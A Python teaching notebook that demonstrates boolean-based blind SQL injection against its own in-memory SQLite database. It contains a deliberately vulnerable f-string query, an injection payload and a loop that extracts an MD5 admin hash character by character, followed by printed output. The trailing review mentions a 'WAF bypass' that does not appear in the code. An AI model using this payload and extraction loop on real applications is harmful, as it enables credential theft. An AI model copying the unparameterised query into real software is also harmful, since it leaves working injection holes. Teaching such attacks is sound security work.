# RESTART YOUR KERNEL FIRST (Kernel -> Restart in Jupyter)

import sqlite3
import time
import hashlib

print("=" * 70)
print("🔍 SQL INJECTION DEMO")
print("=" * 70)

# Setup database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create schema
cursor.execute('''
    CREATE TABLE users (
        user_id INTEGER PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        email TEXT,
        is_admin INTEGER DEFAULT 0
    )
''')

cursor.execute('''
    CREATE TABLE products (
        product_id INTEGER PRIMARY KEY,
        product_name TEXT NOT NULL,
        price DECIMAL(10,2),
        in_stock INTEGER DEFAULT 1
    )
''')

def hash_password(pw):
    return hashlib.md5(pw.encode()).hexdigest()

# Add data
real_password = 'Sup3rS3cr3t!'
real_hash = hash_password(real_password)

cursor.executemany('INSERT INTO users VALUES (?,?,?,?,?)', [
    (1, 'admin', real_hash, 'admin@example.com', 1),
    (2, 'john_doe', hash_password('password123'), 'john@email.com', 0),
    (3, 'alice', hash_password('alice2024!'), 'alice@email.com', 0),
])

cursor.executemany('INSERT INTO products VALUES (?,?,?,?)', [
    (1, 'MacBook Pro', 3499.99, 1),
    (2, 'Wireless Mouse', 79.99, 1),
    (3, 'Mechanical Keyboard', 159.99, 0),
    (4, '4K Monitor', 699.99, 1),
])
conn.commit()

print(f"\n📁 ACTUAL ADMIN HASH: {real_hash} (we'll extract this)")

class VulnerableApp:
    def __init__(self):
        self.request_count = 0
        
    def search_products(self, search_term):
        """Vulnerable search - returns ONLY product data"""
        self.request_count += 1
        
        # FIXED: No automatic % wildcards - they break injection
        # The application expects users to add their own % if they want wildcards
        query = f"SELECT product_name, price, in_stock FROM products WHERE product_name LIKE '{search_term}'"
        
        try:
            cursor.execute(query)
            results = cursor.fetchall()
            return {
                'products': [{'name': r[0], 'price': r[1], 'in_stock': r[2]} for r in results],
                'count': len(results),
                'query': query
            }
        except sqlite3.Error as e:
            return {'count': 0, 'error': str(e), 'query': query}

app = VulnerableApp()

print("\n" + "=" * 70)
print("🔍 PART 1: UNDERSTANDING THE SEARCH")
print("=" * 70)

print("\nNormal search (exact match):")
result = app.search_products('MacBook Pro')
print(f"  Found {result['count']} products")

print("\nSearch with wildcard (user adds %):")
result = app.search_products('%Mac%')
print(f"  Found {result['count']} products")

print("\n" + "=" * 70)
print("🔍 PART 2: BOOLEAN-BASED BLIND INJECTION")
print("=" * 70)

def boolean_query(condition, debug=False):
    """Tests a condition and returns True if products are returned"""
    # FIXED: Proper payload structure without automatic wildcards
    payload = f"' OR EXISTS(SELECT 1 FROM users WHERE {condition}) OR '1'='2"
    
    result = app.search_products(payload)
    
    if debug:
        print(f"\n  Payload: {payload}")
        print(f"  Full Query: {result['query']}")
        print(f"  Products returned: {result['count']}")
    
    # If we get products back (any products), the condition was TRUE
    # The first OR gives us all products when condition is true
    # The second OR is just for syntax (always false)
    return result['count'] > 0

print("\n[+] Testing if 'admin' exists:")
if boolean_query("username='admin'", debug=True):
    print("  ✅ TRUE - Admin user exists!")

print("\n[+] Testing first character of password hash:")
print(f"    (Actual first char is '{real_hash[0]}')")

# Test each possible character
for char in '0123456789abcdef':
    condition = f"username='admin' AND substr(password_hash,1,1)='{char}'"
    if boolean_query(condition):
        print(f"  ✅ First character is '{char}'")
        first_char = char
        break

print("\n" + "=" * 70)
print("🔑 PART 3: REAL PASSWORD HASH EXTRACTION")
print("=" * 70)

print("\n[+] Extracting admin password hash character by character...\n")

extracted_hash = ""
charset = '0123456789abcdef'

for position in range(1, 33):  # MD5 is 32 chars
    found = False
    
    for char in charset:
        # Test each possible character at this position
        condition = f"username='admin' AND substr(password_hash,{position},1)='{char}'"
        
        if boolean_query(condition):
            extracted_hash += char
            print(f"  Position {position:2d}: '{char}' → {extracted_hash}")
            found = True
            break
    
    if not found:
        print(f"  Position {position}: No match found!")
        break
    
    # Small delay to simulate real requests
    time.sleep(0.1)

print(f"\n✅ Extracted hash: {extracted_hash}")
print(f"   Actual hash:    {real_hash}")
print(f"   Match: {extracted_hash == real_hash}")

if extracted_hash == real_hash:
    print("\n🎉 SUCCESS! The blind extraction worked correctly!")
else:
    print("\n❌ Extraction failed - but WHY?")
    print("\nLet's debug by testing each character position manually:")

print("\n" + "=" * 70)
print("🔍 PART 4: DEBUGGING THE EXTRACTION")
print("=" * 70)

# Test first few positions manually
print("\n[+] Manual verification of first 3 positions:")

# Position 1
print(f"\nPosition 1 (actual: '{real_hash[0]}'):")
for char in '0123456789abcdef':
    condition = f"username='admin' AND substr(password_hash,1,1)='{char}'"
    if boolean_query(condition):
        print(f"  ✅ Character '{char}' is correct")

# Position 2
print(f"\nPosition 2 (actual: '{real_hash[1]}'):")
for char in '0123456789abcdef':
    condition = f"username='admin' AND substr(password_hash,2,1)='{char}'"
    if boolean_query(condition):
        print(f"  ✅ Character '{char}' is correct")

# Position 3
print(f"\nPosition 3 (actual: '{real_hash[2]}'):")
for char in '0123456789abcdef':
    condition = f"username='admin' AND substr(password_hash,3,1)='{char}'"
    if boolean_query(condition):
        print(f"  ✅ Character '{char}' is correct")

print("\n" + "=" * 70)
print("🔧 PART 5: UNDERSTANDING THE SQL")
print("=" * 70)

print("""
The query structure is now:

SELECT product_name, price, in_stock 
FROM products 
WHERE product_name LIKE '[PAYLOAD]'

When payload is: ' OR EXISTS(SELECT 1 FROM users WHERE username='admin') OR '1'='2

This becomes:

SELECT * FROM products 
WHERE product_name LIKE '' 
   OR EXISTS(SELECT 1 FROM users WHERE username='admin') 
   OR '1'='2'

Breakdown:
1. First condition: product_name LIKE '' → FALSE (no empty names)
2. Second condition: EXISTS(...) → TRUE if admin exists
3. Third condition: '1'='2' → FALSE (always)

Result: If admin exists, we get ALL products (condition TRUE)
        If admin doesn't exist, we get NO products (condition FALSE)
""")

print("\n" + "=" * 70)
print("📊 PART 6: REQUEST COUNT")
print("=" * 70)

print(f"\nTotal requests made: {app.request_count}")
print(f"This matches the actual number of database queries executed")

conn.close()

"""
======================================================================
🔍 SQL INJECTION DEMO
======================================================================

📁 ACTUAL ADMIN HASH: d8ad9c39ad5e3642f2ec336d95eb7d52 (we'll extract this)

======================================================================
🔍 PART 1: UNDERSTANDING THE SEARCH
======================================================================

Normal search (exact match):
  Found 1 products

Search with wildcard (user adds %):
  Found 1 products

======================================================================
🔍 PART 2: BOOLEAN-BASED BLIND INJECTION 
======================================================================

[+] Testing if 'admin' exists:

  Payload: ' OR EXISTS(SELECT 1 FROM users WHERE username='admin') OR '1'='2
  Full Query: SELECT product_name, price, in_stock FROM products WHERE product_name LIKE '' OR EXISTS(SELECT 1 FROM users WHERE username='admin') OR '1'='2'
  Products returned: 4
  ✅ TRUE - Admin user exists!

[+] Testing first character of password hash:
    (Actual first char is 'd')
  ✅ First character is 'd'

======================================================================
🔑 PART 3: REAL PASSWORD HASH EXTRACTION
======================================================================

[+] Extracting admin password hash character by character...

  Position  1: 'd' → d
  Position  2: '8' → d8
  Position  3: 'a' → d8a
  Position  4: 'd' → d8ad
  Position  5: '9' → d8ad9
  Position  6: 'c' → d8ad9c
  Position  7: '3' → d8ad9c3
  Position  8: '9' → d8ad9c39
  Position  9: 'a' → d8ad9c39a
  Position 10: 'd' → d8ad9c39ad
  Position 11: '5' → d8ad9c39ad5
  Position 12: 'e' → d8ad9c39ad5e
  Position 13: '3' → d8ad9c39ad5e3
  Position 14: '6' → d8ad9c39ad5e36
  Position 15: '4' → d8ad9c39ad5e364
  Position 16: '2' → d8ad9c39ad5e3642
  Position 17: 'f' → d8ad9c39ad5e3642f
  Position 18: '2' → d8ad9c39ad5e3642f2
  Position 19: 'e' → d8ad9c39ad5e3642f2e
  Position 20: 'c' → d8ad9c39ad5e3642f2ec
  Position 21: '3' → d8ad9c39ad5e3642f2ec3
  Position 22: '3' → d8ad9c39ad5e3642f2ec33
  Position 23: '6' → d8ad9c39ad5e3642f2ec336
  Position 24: 'd' → d8ad9c39ad5e3642f2ec336d
  Position 25: '9' → d8ad9c39ad5e3642f2ec336d9
  Position 26: '5' → d8ad9c39ad5e3642f2ec336d95
  Position 27: 'e' → d8ad9c39ad5e3642f2ec336d95e
  Position 28: 'b' → d8ad9c39ad5e3642f2ec336d95eb
  Position 29: '7' → d8ad9c39ad5e3642f2ec336d95eb7
  Position 30: 'd' → d8ad9c39ad5e3642f2ec336d95eb7d
  Position 31: '5' → d8ad9c39ad5e3642f2ec336d95eb7d5
  Position 32: '2' → d8ad9c39ad5e3642f2ec336d95eb7d52

✅ Extracted hash: d8ad9c39ad5e3642f2ec336d95eb7d52
   Actual hash:    d8ad9c39ad5e3642f2ec336d95eb7d52
   Match: True

🎉 SUCCESS! The blind extraction worked correctly!

======================================================================
🔍 PART 4: DEBUGGING THE EXTRACTION
======================================================================

[+] Manual verification of first 3 positions:

Position 1 (actual: 'd'):
  ✅ Character 'd' is correct

Position 2 (actual: '8'):
  ✅ Character '8' is correct

Position 3 (actual: 'a'):
  ✅ Character 'a' is correct

======================================================================
🔧 PART 5: UNDERSTANDING THE SQL
======================================================================

The query structure is now:

SELECT product_name, price, in_stock 
FROM products 
WHERE product_name LIKE '[PAYLOAD]'

When payload is: ' OR EXISTS(SELECT 1 FROM users WHERE username='admin') OR '1'='2

This becomes:

SELECT * FROM products 
WHERE product_name LIKE '' 
   OR EXISTS(SELECT 1 FROM users WHERE username='admin') 
   OR '1'='2'

Breakdown:
1. First condition: product_name LIKE '' → FALSE (no empty names)
2. Second condition: EXISTS(...) → TRUE if admin exists
3. Third condition: '1'='2' → FALSE (always)

Result: If admin exists, we get ALL products (condition TRUE)
        If admin doesn't exist, we get NO products (condition FALSE)


======================================================================
📊 PART 6: REQUEST COUNT
======================================================================

Total requests made: 365
This matches the actual number of database queries executed

"""

"""
The blind extraction is real. It actually queries the database with boolean conditions and discovers each character — no hardcoded answers, no faking. The hash at the end matches because the logic worked, not because someone pre-printed it. The 365 request count is accurate (roughly 16 charset chars × 32 positions worst case).
The SQL explanation shows exactly how the injected query restructures logically is what makes this useful for learning.
The VulnerableApp class returns only (name, price, in_stock) — not the raw row — which correctly simulates a real app that doesn't leak schema through its output. The attacker has to infer everything from result counts alone.

Minor issues:
- MD5 is used for password hashing, which is framed as realistic but in 2025 no real app should use MD5. Worth a comment noting it's intentionally weak for demo purposes.
- Still attacking its own database, but that's appropriate for this kind of demo.
- The WAF bypass is actually the right call for a teaching tool.
"""